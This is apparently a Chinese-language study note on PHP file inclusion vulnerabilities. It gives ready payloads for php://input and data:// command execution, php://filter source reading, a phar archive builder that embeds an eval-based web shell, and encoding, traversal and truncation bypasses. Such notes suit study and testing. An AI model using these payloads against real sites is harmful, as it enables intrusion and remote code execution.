[TOC]



# 1.文件包含相关函数

​	include()，include_once()，require()，require_once()

- require()函数如果在包含的时候有错，如文件不存在，会直接退出，不执行后面的语句
- include()函数如果在包含的时候有错，如文件不存在，不会直接退出，会执行后面的语句
- include_once()和incline()的作用类似，如果一个文件已经被包含，则include_once()不会再包含它，避免函数重新定义或者变量重新赋值等
- include和require区别主要是，**include在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；而require函数出现错误的时候，会直接报错并退出程序的执行。**

​	用这几个函数包含文件时，无论什么类型的文件，都会当做php文件进行解析。

​	分类：

- LFI（Local File Inclusion）

- RFI（Remote File Inclusion）

  利用条件较为苛刻，allow_url_fopen = on，all_url_include = on

  两个配置选项均需on，才能远程包含文件成功。

文件包含漏洞主要的危害

>   1.PHP包含漏洞结合上传漏洞；
>
>   2.PHP包含读文件；
>
>   3.PHP包含写文件；
>
>   4.PHP包含日志文件；
>
>   5.PHP截断包含；
>
>   6.PHP内置伪协议利用。

# 2.文件包含漏洞的利用方式--伪协议

| 协议              | 测试版本 | allow_url_fopen | all_url_include | 用法                                                         |
| ----------------- | -------- | --------------- | --------------- | ------------------------------------------------------------ |
| file://           | >=5.2    | off/on          | off/on          | ?file=file://D:/phpstudy/WWW/phpcode.txt                     |
| php://filter      | >=5.2    | off/on          | off/on          | ?file=php://filter/read=convert.base64-encode/resource=./index.php |
| php://input       | >=5.2    | off/on          | on              | ?file=php://input             [POST DATA] <?php phpinfo()?>  |
| zip://            | >=5.2    | off/on          | off/on          | ?file=zip://D:/phpstydy/WWW/file.zip#phpcode.txt             |
| data://           | >=5.2    | on              | on              | ?file=data://text/plain,<?php phpinfo()?>                        [OR]?file=data://text/plain;base64,[base64编码]                   [oR]?file=data:text/plain,<?php phpinfo()?>                           [OR]?file=data:text/plain;base64,[base64编码] |

php://filter  是一种元封装器，设计用于数据楼打开是的筛选过滤应用

data://   同样类似于php://input，可以让用户控制输入流

php://input可以访问请求的原始数据的制度刘，将post请求的数据当做PHP代码执行

phar://xxxx.png/shell.php解压缩包的一个函数，不管后缀是什么，都会当做压缩包来解压

--------------

假如：

```php
<?php
$file =  $_GET['page'];
include $file;
?>
    
a.txt中：phpinfo()
```

当payload是：/?page=a.txt，可以看出即使是txt文件也可以当做php来解析,这就是文件包含的强大之处。





## 之后的测试代码

```php
<?php
    $file = $_GET['file'];
    include $file;
	highlight_file(__FILE__);
?>
//www目录
    //有a.txt，<?php phpinfo();?>
    //有a.zip,里面含a.txt
```

## php://input

​	利用条件：

> ​		allow_url_include=on，allow_url_fopen不做要求

```php
姿势：
/?file=php://input
[post]
<?php phpinfo();?>
<?php system('net user');?>
```

可以直接命令执行。。。

## php://filter

> ​	利用条件：上面的那两个配置文件选项都不做要求

```php
姿势
/?file=php://filter/read=convert.base64-encode/resource=a.txt
/?file=php://filter/convert.base64-encode/resource=a.txt
```

​	通过指定末尾的文件，可以读取经base64加密后的文件源码，虽然不能获取shell，但危害也挺大。

## phar://

phar是一个文件归档的包，类似于Java中的Jar文件，方便了PHP模块的迁移。

php中默认安装了这个模块。

> ​	利用条件：PHP版本>=5.3.0

```php
假设有个a.zip压缩包，里面有个a.txt里面有<?php phpinfo();?>
/?file=phar://a.zip/a.txt
绝对相对路径都OK
```

### 1.创建一个phar文件

在创建phar文件的时候要注意phar.readonly这个参数要为off，否则phar文件不可写。

```php
<?php
$p = new phar("shell.phar", 0 , "shell.phar");
$p->startBuffering();
$p['shell.php'] = '<?php phpinfo(); @eval($_POST[x])?>';
$p->setStub("<?php Phar::mapPhar('shell.phar'); __HALT_COMPILER?>");
?>
```

运行以上代码后会在当前目录下生成一个名为shell.phar的文件，这个文件可以被include，file_get_contents等函数利用

### 2.利用phar

利用phar文件的方法很简单，利用phar特定的格式就可以加以利用

```php
<?php
include 'phar://shell.phar/shell.php';
?>
```

这样就可以成功把shell包含进来。当我们把shell.phar文件重命名为shell.aaa等一些无效的后缀名时，一样可以使用，**说明了phar文件不受文件格式的影响。**



有了phar文件，我们就能有一些猥琐的思路了，比如上传的文件名遭到了限制，我们无法上传php的文件，但是却只能包含php文件的时候（包含文件后缀名被限制 include ‘$file’.’.php’），我们就可以通过上传phar文件，再利用php伪协议来包含。



### 扩展

与phar类似的还有，zip://协议也与phar类似，但是上传了包含有一句话的zip文件后包含的姿势有所不同

include ‘zip://shell.zip#shell.php’ 利用#隔开，在URL中包含时要用%23，与URL中#号区分开。

（注意：php 5.3.4后已经修复了%00截断漏洞）





## zip://

> 利用条件：
>
> ​	PHP版本>=5.3.0
>
> ​	需要绝对路径，同时编码#为%23

```php
/?file=zip://D:\wamp64\www\a.zip%23a.txt
//如果使用相对路径，包含会失败。
```

## data://

> 利用条件：
>
> ​	1.PHP版本大于5.2
>
> ​	2.allow_url_fopen=on
>
> ​	3.allow_url_include=on

```
姿势一：
	/?file=data:text/plain,<?php phpinfo();?>
	/?file=data:text/plain,<?php system('whoami')?>
姿势二：
	/?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b
	+号的URL编码%2b,base64解码为<?php phpinfo();?>
```



# 3.绕过

正常平台不可能直接是 `include $_GET['file'];` 这么简单，一般会指定前后缀

## 指定前缀

```php
<?php
    $file = $_GET['file'];
    include '/var/www/html/'.$file;
?>
```

### 	目录遍历

​		假设/var/log/test.txt中有代码<?php phpinfo();?>

```
/?file=../../log/test.txt
```

​	服务器会对../等做过滤，可以用编码来绕过

```
利用url编码
	../
		%2e%2e%2f
		..%2f
		%2e%2e/
	..\
		%2e%2e%5c
		..%5c
		%2e%2e\
二次编码
	../
		%252e%252e%252f
	..\
		%252e%252e%255c
```

## 指定后缀

```php
测试代码：
<?php
    $file = $_GET['file'];
    include $file.'/test/test.php';
?>
```

### URL

URL： `protocol :// hostname[:port] / path / [;parameters][?query]#fragment`

在RFI中，可以利用query或fragment来绕过

#### 	姿势一：query(?)

```
/?file=http://xxxx/info.txt?
```

则包含的文件为 `http://xxxx/info.txt?/test/test.php`

问号后面的 `/test/test.php` 被当做query后缀而被绕过

#### 姿势二：fragment(#)

```
/?file=http://xxxx/info.txt%23
```

则包含的文件为 `http://xxxx/info.txt#/test/test.php`

#后面的 `/test/test.php` 被当做query后缀而被绕过，需要将#编码为%23

### 利用协议

```
测试代码：
<?php
    $file = $_GET['file'];
    include $file."phpinfo.txt";
?>
```

#### zip://

- [访问参数] `?file=zip://D:\zip.jpg%23phpinfo`
- [拼接后]  `?file=zip://D:\zip.jpg#phpinfo.txt`

#### phar://

- [访问参数] `?file=phar://xx.zip/phpinfo`
- [拼接后]  `?file=phar://xx.zip/phpinfo.txt`

**Example：**
目录中有a.zip压缩包，内含a.txt，其中包含代码<?php phpinfo();?>
构造payload为：

```
?file=zip://D:\phpstudy\www\a.zip%23a.txt
?file=phar://../../a.zip/a.txt
```

## 长度截断

`一共有三种：../     ./    和.(点号)`

Windows 256,Linux 4096

利用条件：php版本<5.2.8

只要./不断重复()，则后缀`/test/test.php`，在达到最大值后会被直接丢弃掉。

```
/?file=././..........././shell.txt
```

## 00截断

利用条件：

`php版本<5.3.4`

```
/?file=phpinfo.txt%00
```

